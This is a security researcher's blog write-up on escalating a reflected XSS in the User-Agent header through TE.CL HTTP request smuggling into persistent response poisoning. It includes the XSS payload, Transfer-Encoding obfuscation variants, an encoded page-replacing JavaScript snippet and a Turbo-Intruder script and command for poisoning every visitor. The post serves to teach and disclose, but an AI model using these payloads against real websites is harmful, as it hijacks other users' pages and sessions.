---
title: Exploiting HTTP Request Smuggling (TE.CL)- XSS to website takeover
updated: 2021-03-10 22:46
---
Even though HTTP Request Smuggling is documented back on 2005, it is still one of the least known Webapp vulnerability out there.

After a little break I decided to hunt a private company (which is not eligible for Bug Bounty, but still accepting reports) and what I found might be worth sharing.

## Reflected XSS in User-Agent Header

I have developed my own smart XSS fuzzing (which might be soon published) which tests both URL Endpoints and HTTP Headers. Luckily it found that User-Agent is being reflected. We can confirm it by manually send a request with Burp Suite:

![reflected_xss_burp](https://cdn-images-1.medium.com/max/800/1*M_stlWovazY6bcg702cbPQ.jpeg)

The word Exploitation is being reflected, let's put a simple XSS and break the Javascript String. The payload will look like this:

```
"><script>alert(`XSS`)</script>
```

We got XSS, nothing new and interesting by far. Mostly Private Programs don't accept this bug as in real cases, you can't send special-crafted HTTP request to an end user. Let's try to escalate this innocent-looking XSS into something more spicy.

## Recon and Detecting HTTP Request Smuggling

Burp Suite has a built-in Extension for this type of vulnerability, and it does test any kind of Smuggling while I do enumerating.


![burp_suite_extension](https://cdn-images-1.medium.com/max/800/1*WMItqq0i4OSHlL3q4ce7VQ.png)

Now let's perform automatic scans, go to **Repeater**, right click and click on **Launch Smuggle probe**.

![burp_suite_extension_right_click](https://cdn-images-1.medium.com/max/800/1*HuthN9dwqT5dvK_Ydu6s4w.png)

If HTTP Smuggling vulnerability  is detected, it will be issued on Target tab (it might take some minutes to perform the scans in the background)

![vuln_found_by_burp_extension](https://cdn-images-1.medium.com/max/800/1*-uByNsDX3Mr5056RZkc1uw.png)

## TE.CL Exploit Development

Before we craft our special-request in Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked, this way our Content-Length value doesn't automatically change by Burp Suite, this is a crucial part on this kind of exploitation.

Below is our crafted payload. Keep in mind that the 2 headers (Transfer-Encoding, and Connection) must be always included. The first chunk (A x 1000) is going to be requested to the front-end server, it contains nothing malicious because it is just a regular request as an ordinary user would do. The reason why Content-length is 1007 (in the photo below is 1005, oops…), is because there are 1000*A + \r\n + 3e8 + b0. Which means 1000 + 2 + 3 + 2 = 1007 bytes. Note: b0 is still considered a part of the first request even though it defines the length of the smuggled request.

The second chunk of data is our smuggled request, if successful, we should get Error 404 requests as there is no directory **/404hopefully** on the website. 
After the second chunk, is mandatory to add x=1 or bunch of random data and two newlines after 0.

```
0\r\n\r\n
\r\n\r\n
```
![smuggling_request_development](https://cdn-images-1.medium.com/max/800/1*vO8vcAcB4AfDjCSvBFJY-g.jpeg)

Send this request to Turbo-Intruder and if we get any 404 Request, it means that our Special-Crafted request is sent to Back-End server.

![turbo_intruder_vuln_identification](https://cdn-images-1.medium.com/max/800/1*WtmzjvOS7UP-Ban2bQo5lA.png)

## Suffix Space Bypass - Obfuscating TE Header

We have to obfuscate the TE header, because one of the servers can be induced not to process it. This technique works on quite a few systems, but we can exploit many more by making the Transfer-Encoding header slightly harder to spot, so that one system doesn't see it. Here are some payloads by James Kettle:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

 Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
 : chunked
```

I used the whitespace as a bypass method.

![suffix_tab_bypass](https://cdn-images-1.medium.com/max/800/1*FdNCO994ZtOwLEuKfRn9iA.png)

## Poisoning response and website takeover

This is our final crafted request, the difference is that the XSS payload is added to the smuggled request in User-Agent Header (which we discovered before). Save it as request.txt to launch the attack with Turbo-Intruder:

![final_crafted_request](https://cdn-images-1.medium.com/max/800/1*rfYL92DvrQYO4d8ivafGRA.png)

Inside **script.js** is a simple code which generates a HTML website as a POC (kinda servers as a DOM XSS):

```
document.documentElement.innerHTML=String.fromCharCode(60, 104, 116, 109, 108, 62, 10, 60, 104, 49, 62, 85, 115, 101, 114, 39, 115, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 105, 115, 32, 112, 111, 105, 115, 111, 110, 101, 100, 32, 119, 105, 116, 104, 32, 72, 84, 84, 80, 32, 82, 101, 113, 117, 101, 115, 116, 32, 83, 109, 117, 103, 103, 108, 105, 110, 103, 32, 97, 110, 100, 32, 88, 83, 83, 60, 47, 104, 49, 62, 10, 60, 47, 104, 116, 109, 108, 62, 10)
```

Here is our **setup.txt** which contains the configuration part of Turbo-Intruder:

```
#credits to https://hipotermia.pw/bb/http-desync-account-takeover
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=20,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()
    
    attack = target.req
    engine.queue(attack)
    
    victim = target.req
    for i in range(100000000):
        engine.queue(victim)
        time.sleep(0.05)
        
def handleResponse(req, interesting):
    table.add(req)
```

There is nothing much left to do, so fire up [Turbo-Intruder](https://github.com/PortSwigger/turbo-intruder/releases/tag/1.2.0) and poison everyone:

```
java -jar turbo-intruder-all.jar setup.txt request.txt https://www.target.com/ /
```

![turbo_intruder_poisoning_users](https://cdn-images-1.medium.com/max/800/1*4ZBYWE8VVbdPg090oNTN-g.jpeg)

As long as the Turbo-Intruder is being run, the XSS payload will be persistent on the website. Below is Javascript being executed:

![persistente_xss](https://cdn-images-1.medium.com/max/800/1*sNy8N8Q_DzAWnE82n8BOCw.jpeg)

### References:
References:
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
https://portswigger.net/web-security/request-smuggling
https://www.youtube.com/watch?v=JW2fM_GmidU&t=1s
